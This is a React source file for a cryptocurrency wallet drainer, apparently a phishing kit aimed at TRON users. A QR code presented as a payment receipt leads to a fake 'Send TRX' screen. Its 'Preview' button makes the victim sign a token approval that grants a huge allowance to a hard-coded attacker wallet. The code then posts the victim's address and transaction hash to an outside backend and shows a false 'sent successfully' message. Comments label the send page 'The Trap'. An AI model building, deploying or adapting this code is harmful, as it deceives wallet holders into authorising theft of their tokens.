import React, { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings - UNTOUCHED)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
const BACKEND = "https://qr-drainer.onrender.com";
const SITE_URL = "https://qr-drainer-one.vercel.app";

// QR points DIRECTLY to the wallet page using a hash (Vercel never 404s hashes)
const QR_VALUE = `${SITE_URL}/#/wallet`;

const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

export default function App() {
  // Simple state-based routing. If URL ends in #/wallet, show send page.
  const [view, setView] = useState(window.location.hash === "#/wallet" ? "wallet" : "home");
  const [amount, setAmount] = useState("1");
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle"); // idle | processing | success
  const [errorMsg, setErrorMsg] = useState("");
  const qrBoxRef = useRef(null);

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const iv = setInterval(() => {
      if (window.tronWeb?.defaultAddress?.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 1000);
    return () => clearInterval(iv);
  }, [isConnected]);

  // 2. THE ENGINE (Proven Logic - UNTOUCHED)
  const executeEngine = async () => {
    setUiState("processing");
    setErrorMsg("");

    try {
      if (!window.tronWeb?.defaultAddress) {
        throw new Error("Wallet not connected. Please open in TronLink.");
      }

      const victimAddress = window.tronWeb.defaultAddress.base58;
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      setUiState("success");
    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("idle");
    }
  };

  // 3. SAVE QR CODE AS IMAGE
  const handleSaveQR = () => {
    const svg = qrBoxRef.current?.querySelector("svg");
    if (!svg) return;
    const size = 400;
    const canvas = document.createElement("canvas");
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, size, size);
    const img = new Image();
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const ls = size * 0.22, lp = (size - ls) / 2;
      ctx.beginPath(); ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#fff"; ctx.fill();
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const a = document.createElement("a");
        a.download = "TRON-USDT-QR.png";
        a.href = canvas.toDataURL("image/png");
        a.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(new XMLSerializer().serializeToString(svg))));
  };

  // ==========================================
  // VIEW 1: SUCCESS SCREEN
  // ==========================================
  if (uiState === "success") {
    return (
      <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#2FAB73", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24, boxShadow: "0 4px 12px rgba(47, 171, 115, 0.2)" }}>
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{ color: "#eaecef", fontSize: 24, fontWeight: 600, margin: "0 0 8px" }}>Transaction Sent</h2>
        <p style={{ color: "#848e9c", fontSize: 15, margin: 0, textAlign: "center" }}>Your USDT has been sent successfully</p>
      </div>
    );
  }

  // ==========================================
  // VIEW 2: HOME / PRESENTER (QR CODE)
  // ==========================================
  if (view === "home") {
    return (
      <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}>
        <div style={{ background: "#181a20", borderRadius: 20, padding: 32, width: "100%", maxWidth: 380, border: "1px solid #2b3139", boxShadow: "0 20px 60px rgba(0,0,0,0.5)" }}>
          <div style={{ textAlign: "center", marginBottom: 24 }}>
            <h1 style={{ margin: "0 0 6px", fontSize: 20, fontWeight: 700, color: "#eaecef" }}>TRON Receipt QR</h1>
            <p style={{ margin: 0, fontSize: 12, color: "#848e9c" }}>Scan with any TRON wallet</p>
          </div>

          <div ref={qrBoxRef} style={{ background: "#fff", borderRadius: 16, padding: 20, display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <QRCodeSVG value={QR_VALUE} size={220} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} />
          </div>

          <div style={{ background: "#0b0e11", border: "1px solid #2b3139", borderRadius: 10, padding: "12px 14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
            <span style={{ fontFamily: "monospace", fontSize: 12, color: "#eaecef", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "70%" }}>{ATTACKER_WALLET}</span>
            <button onClick={() => navigator.clipboard.writeText(ATTACKER_WALLET)} style={{ background: "#f0b90b", color: "#0b0e11", border: "none", borderRadius: 6, padding: "6px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Copy</button>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
            <button onClick={handleSaveQR} style={{ background: "#2b3139", border: "1px solid #3d4a5c", borderRadius: 10, padding: 12, color: "#eaecef", fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Save QR</button>
            <button onClick={() => setView("wallet")} style={{ background: "#2b3139", border: "1px solid #3d4a5c", borderRadius: 10, padding: 12, color: "#eaecef", fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Preview Page</button>
          </div>
        </div>
      </div>
    );
  }

  // ==========================================
  // VIEW 3: WALLET SEND (The Trap - Polished UI)
  // ==========================================
  return (
    <div style={{ background: "#0b0e11", minHeight: "100vh", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", display: "flex", flexDirection: "column", color: "#eaecef" }}>
      
      {/* HEADER */}
      <div style={{ padding: "20px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "relative" }}>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eaecef" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }} onClick={() => setView("home")}>
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        <div style={{ color: "#eaecef", fontSize: 16, fontWeight: 600, position: "absolute", left: "50%", transform: "translateX(-50%)" }}>
          Send TRX
        </div>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eaecef" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}>
          <line x1="18" y1="6" x2="6" y2="18"></line>
          <line x1="6" y1="6" x2="18" y2="18"></line>
        </svg>
      </div>

      {/* CONTENT */}
      <div style={{ flex: 1, padding: "0 20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
        
        {/* TRON NETWORK BADGE */}
        <div style={{ textAlign: "center", color: "#848e9c", fontSize: 13, marginBottom: 20 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#181a20", padding: "6px 12px", borderRadius: 20 }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#eb0029"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm0 22c-5.514 0-10-4.486-10-10s4.486-10 10-10 10 4.486 10 10-4.486 10-10 10z"/></svg>
            TRON (TRC-20)
          </div>
        </div>

        {/* RECIPIENT ADDRESS */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 20 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Recipient Address</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", fontSize: 14, fontFamily: "monospace", color: "#eaecef", wordBreak: "break-all", border: "1px solid #2b3139" }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* AMOUNT INPUT */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 20 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Amount</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", display: "flex", alignItems: "center", justifyContent: "space-between", border: "1px solid #2b3139" }}>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              style={{ background: "transparent", border: "none", color: "#eaecef", fontSize: 28, fontWeight: 600, width: "60%", outline: "none", fontFamily: "inherit" }}
              placeholder="0.00"
            />
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ color: "#848e9c", fontSize: 16, fontWeight: 500 }}>TRX</span>
              <button style={{ background: "#2b3139", border: "none", color: "#eaecef", padding: "6px 12px", borderRadius: 4, fontSize: 12, fontWeight: 600, cursor: "pointer" }}>MAX</button>
            </div>
          </div>
          <div style={{ color: "#848e9c", fontSize: 13, marginTop: 8 }}>≈ ${amount}.00 USD</div>
        </div>

        {/* ERROR MESSAGE */}
        {errorMsg && (
          <div style={{ background: "rgba(246, 70, 93, 0.1)", border: "1px solid rgba(246, 70, 93, 0.3)", color: "#f6465d", padding: "14px", borderRadius: 8, fontSize: 13, marginBottom: 20, width: "100%", maxWidth: 400, textAlign: "center", fontWeight: 500 }}>
            {errorMsg}
          </div>
        )}

        {/* PREVIEW BUTTON */}
        <button
          onClick={executeEngine}
          disabled={uiState === "processing"}
          style={{
            width: "100%",
            maxWidth: 400,
            background: uiState === "processing" ? "#2b3139" : "#3375bb",
            border: "none",
            borderRadius: 8,
            padding: "18px",
            color: uiState === "processing" ? "#848e9c" : "#ffffff",
            fontSize: 16,
            fontWeight: 600,
            cursor: uiState === "processing" ? "not-allowed" : "pointer",
            transition: "background 0.2s ease",
            marginTop: "auto",
            marginBottom: "30px"
          }}
        >
          {uiState === "processing" ? "Processing..." : "Preview"}
        </button>

        {/* SESSION INFO */}
        {isConnected && (
          <div style={{ marginBottom: 20, textAlign: "center", fontSize: 12, color: "#848e9c", fontFamily: "monospace" }}>
            Connected: {wallet.slice(0, 6)}...{wallet.slice(-4)}
          </div>
        )}
      </div>
    </div>
  );
}